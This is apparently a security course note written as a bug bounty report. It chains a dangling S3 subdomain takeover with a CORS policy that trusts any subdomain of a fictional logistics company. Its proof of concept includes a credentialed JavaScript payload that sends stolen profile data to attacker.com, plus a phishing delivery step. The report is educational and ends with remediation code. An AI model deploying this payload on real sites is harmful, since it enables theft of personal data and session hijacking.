---
tags: [bug-bounty, chaining, real-world, vapt]
difficulty: advanced
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.04 Bug Bounty Report Subdomain Takeover"
---

# 60.04 Bug Bounty Report: Subdomain Takeover Chained with CORS Misconfiguration for Session Hijacking

## 1. Executive Summary

This report outlines a highly impactful attack chain initiated by a seemingly low-severity infrastructure misconfiguration: a Subdomain Takeover. During a reconnaissance phase against a major logistics provider, an orphaned CNAME record was identified pointing to an unclaimed Amazon S3 bucket.

While a basic Subdomain Takeover typically allows an attacker to host defacement content or launch phishing campaigns (usually a Medium severity issue), a deeper analysis of the main application's architecture revealed a severe Cross-Origin Resource Sharing (CORS) misconfiguration. The main web application blindly trusted any subdomain under the corporate domain.

By combining the Subdomain Takeover with the CORS vulnerability, the attacker was able to host malicious JavaScript on the hijacked subdomain. This script could silently issue authenticated requests to the main API, exfiltrating sensitive user data and CSRF tokens, effectively resulting in widespread Session Hijacking and Account Takeover (ATO) for any user who visited the hijacked subdomain.

## 2. Vulnerability Description

The exploit chain utilizes two distinct vulnerabilities:

1.  **Subdomain Takeover (Dangling DNS):** A DNS record `assets.beta.target-logistics.com` existed, acting as a CNAME pointing to `target-assets-beta.s3.amazonaws.com`. However, the corresponding S3 bucket had been deleted by the company months prior. Because the bucket name was now available, an attacker could create a new S3 bucket with that exact name, effectively gaining complete control over the content served at `assets.beta.target-logistics.com`.
2.  **CORS Misconfiguration (Overly Permissive Trust):** The main production API (`api.target-logistics.com`) relied on CORS to restrict which origins could make cross-site AJAX requests. However, instead of explicitly whitelisting specific origins, the backend used a regular expression that trusted *any* subdomain of `target-logistics.com`.
    ```http
    Access-Control-Allow-Origin: https://assets.beta.target-logistics.com
    Access-Control-Allow-Credentials: true
    ```

When combined, the attacker uses the hijacked subdomain as a trusted origin to bypass the Same-Origin Policy (SOP) enforced by the browser.

## 3. Scope and Target

- **Target Domain:** `target-logistics.com`
- **Hijacked Subdomain:** `assets.beta.target-logistics.com`
- **Vulnerable API:** `api.target-logistics.com`
- **Impact:** High (Session Hijacking, PII Data Exfiltration)

## 4. Prerequisites

1.  A dangling CNAME record pointing to an unclaimed third-party service (e.g., AWS S3, GitHub Pages, Heroku).
2.  The target's main API must have a dynamically generated `Access-Control-Allow-Origin` header that explicitly trusts the hijacked subdomain.
3.  `Access-Control-Allow-Credentials: true` must be enabled on the API to allow cookies/sessions to be sent with the cross-origin request.
4.  The victim must be logged into the main application.

## 5. ASCII Architecture & Attack Diagram

```text
                                Victim Browser
                                (Logged into target-logistics.com)
                                      |
                                      | 1. Visits Attacker's link
                                      |    https://assets.beta.target-logistics.com
                                      v
+-----------------------------------------------------------------------------------+
| Attacker-Controlled S3 Bucket                                                     |
| (Hosting malicious index.html with JavaScript)                                    |
|                                                                                   |
| <script>                                                                          |
|   fetch("https://api.target-logistics.com/user/profile", {credentials: "include"})|
|   .then(res => res.text())                                                        |
|   .then(data => exfiltrate(data));                                                |
| </script>                                                                         |
+-----------------------------------------------------------------------------------+
                                      |
                                      | 2. JS executes in browser. Browser sends
                                      |    AJAX request with session cookies.
                                      v
                            +-------------------+
                            |                   |
                            | Main Target API   |
                            | (api.target...)   |
                            |                   |
                            +-------------------+
                                      |
                                      | 3. API checks Origin header. Matches regex
                                      |    for *.target-logistics.com. Returns data.
                                      v
                                Victim Browser
                                      |
                                      | 4. JS receives sensitive profile data
                                      |    and sends it to Attacker's Drop Server.
                                      v
                            +-------------------+
                            |                   |
                            | Attacker Server   | <-- Receives PII, Session Tokens
                            |                   |
                            +-------------------+
```

## 6. Step-by-Step Proof of Concept (PoC)

### Step 1: Subdomain Reconnaissance

Using tools like `subfinder`, `amass`, and `dnsx`, a list of subdomains was generated.
Running a tool like `nuclei` or `subzy` against the list flagged `assets.beta.target-logistics.com`.

DNS Lookup verification:
```bash
dig assets.beta.target-logistics.com
```
Result:
```text
assets.beta.target-logistics.com. 300 IN CNAME target-assets-beta.s3.amazonaws.com.
target-assets-beta.s3.amazonaws.com. 300 IN A 52.216.144.123
```

Navigating to `http://assets.beta.target-logistics.com` returned an AWS S3 `NoSuchBucket` error, confirming the vulnerability.

### Step 2: Claiming the Bucket

The attacker logs into their own AWS console, creates an S3 bucket named precisely `target-assets-beta`, and configures it for static website hosting. They upload an `index.html` file containing a simple "Hello World" to verify control.

### Step 3: Analyzing CORS on the Main API

While testing the main application (`https://app.target-logistics.com`), the attacker notices API requests to `api.target-logistics.com`.

They test the CORS policy using `curl`:
```bash
curl -H "Origin: https://assets.beta.target-logistics.com" -I https://api.target-logistics.com/v1/profile
```
Response:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://assets.beta.target-logistics.com
Access-Control-Allow-Credentials: true
```
The API reflects the Origin, confirming that *any* subdomain is trusted.

### Step 4: Weaponizing the S3 Bucket

The attacker replaces the `index.html` in the S3 bucket with a malicious payload designed to exfiltrate data.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Beta Testing</title>
</head>
<body>
    <h1>Loading Beta Assets...</h1>
    <script>
        // Request sensitive user data from the API
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.target-logistics.com/v1/profile', true);
        xhr.withCredentials = true; // Crucial: Send cookies!
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                // Exfiltrate the stolen data
                var stolenData = btoa(xhr.responseText);
                var img = new Image();
                img.src = 'https://attacker.com/log?data=' + stolenData;
            }
        };
        xhr.send();
    </script>
</body>
</html>
```

### Step 5: Execution

The attacker sends the link `https://assets.beta.target-logistics.com` to victims (e.g., via a targeted phishing email claiming to be a new beta portal).
Because the domain is legitimately owned by `target-logistics.com`, it passes visual inspection and email security filters. When the victim clicks the link, the JavaScript executes, steals their profile data (including API keys or CSRF tokens), and silently sends it to the attacker.

## 7. Deep Dive: Why did this happen?

1.  **Dangling DNS (Infrastructure Management Issue):** The DevOps team decommissioned the old beta environment by deleting the S3 bucket but forgot to remove the corresponding CNAME record in Route53. This is a common failure in asset lifecycle management.
2.  **Wildcard CORS (Application Security Issue):** Developers often use wildcard CORS policies (`*.domain.com`) to make cross-origin requests easier during development across multiple staging environments. However, this violates the principle of least privilege. If even one subdomain is compromised (via takeover, XSS, or other means), the security of the entire domain boundary collapses.

## 8. Impact Assessment

- **Data Breach:** Exposure of highly sensitive Personally Identifiable Information (PII), billing addresses, and internal system IDs.
- **Account Compromise:** If the API returns CSRF tokens or session identifiers, the attacker can hijack the account entirely.
- **Reputational Damage:** Phishing campaigns originating from an official corporate subdomain have extraordinarily high success rates and severely damage customer trust.

## 9. Remediation and Mitigation

**1. Fix the Subdomain Takeover:**
Immediately delete the dangling CNAME record from the DNS zone file. Implement automated infrastructure scanning (e.g., using open-source tools like `dnsReaper`) to continuously monitor for dangling DNS records.

**2. Fix the CORS Misconfiguration:**
Never use dynamic wildcard reflection for the `Access-Control-Allow-Origin` header, especially when `Access-Control-Allow-Credentials` is set to `true`.
Maintain a strict, hardcoded whitelist of allowed origins.

```javascript
// Secure Node.js/Express CORS Configuration
const allowedOrigins = [
    'https://app.target-logistics.com',
    'https://admin.target-logistics.com'
];

app.use(cors({
    origin: function(origin, callback){
        if(!origin) return callback(null, true);
        if(allowedOrigins.indexOf(origin) === -1){
            var msg = 'The CORS policy for this site does not allow access from the specified Origin.';
            return callback(new Error(msg), false);
        }
        return callback(null, true);
    },
    credentials: true
}));
```

## 10. Chaining Opportunities

- **[[02 - Bug Bounty Report Account Takeover Chain]]:** The exfiltrated CSRF tokens can be used to forge state-changing requests, such as changing the victim's email address or password, leading to ATO.
- **[[01 - Bug Bounty Report Critical SQLi]]:** If the API endpoints accessed via CORS contain further vulnerabilities, the attacker can exploit them with the privileges of the hijacked session.

## 11. Related Notes

- [[18 - Cross-Origin Resource Sharing (CORS) Security]] - Detailed mechanics of CORS.
- [[31 - API Security]] - Securing API perimeters.
- [[55 - Cloud DNS and Infrastructure Automation]] - Managing DNS lifecycles to prevent dangling records.

```
